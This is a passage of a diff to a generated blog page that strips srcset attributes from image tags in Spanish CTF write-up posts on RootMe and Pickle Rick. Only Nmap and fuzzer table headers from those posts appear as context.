-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php_hud804123877fee4a46e198468309b463a_31420_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/error-php_hud804123877fee4a46e198468309b463a_31420_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2635,7 +2761,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good.png&#34;
 	width=&#34;696&#34;
 	height=&#34;566&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good_hud323d254a3cc62622e1e6e0ae32f42cf_38983_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/upload-good_hud323d254a3cc62622e1e6e0ae32f42cf_38983_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2648,7 +2774,7 @@ ID           Response   Lines    Word       Chars       Payload
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2.png&#34;
 	width=&#34;437&#34;
 	height=&#34;235&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2_hu6a993dd588174aabe193694c1a502081_24290_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-ctf-rootme/images/uploads2_hu6a993dd588174aabe193694c1a502081_24290_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2819,7 +2945,7 @@ PORT   STATE SERVICE VERSION
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web.png&#34;
 	width=&#34;1308&#34;
 	height=&#34;667&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web_hu9b80ccb1105af0368b02fd734261ad91_684716_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/web_hu9b80ccb1105af0368b02fd734261ad91_684716_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
@@ -2865,7 +2991,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.55 seconds
 &lt;p&gt;&lt;img src=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal.png&#34;
 	width=&#34;710&#34;
 	height=&#34;462&#34;
-	srcset=&#34;https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal_hu6367a3b4a33a905fa978a812a31fca64_23453_480x0_resize_box_3.png 480w, https://d3b0o.github.io/p/resoluci%C3%B3n-pickle-rick/images/portal_hu6367a3b4a33a905fa978a812a31fca64_23453_1024x0_resize_box_3.png 1024w&#34;
+	
 	loading=&#34;lazy&#34;
 	
 	
